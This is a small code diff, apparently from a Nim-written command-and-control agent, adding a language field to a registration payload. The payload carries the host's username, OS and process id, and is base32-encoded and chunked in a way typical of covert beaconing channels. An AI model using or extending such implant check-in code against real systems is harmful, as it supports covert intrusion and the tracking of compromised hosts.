@@ -233,7 +233,8 @@ proc register*(t: var AgentTransport): bool =
     "username": getEnvStr("USERNAME", "UNKNOWN"),
     "os":       "windows/amd64",
     "pid":      pid,
-    "aes_key":  ""
+    "aes_key":  "",
+    "language": "nim"
   }
   let encoded = b32Encode(cast[seq[byte]]($payload))
   let chunks  = chunkStr(encoded, 48)
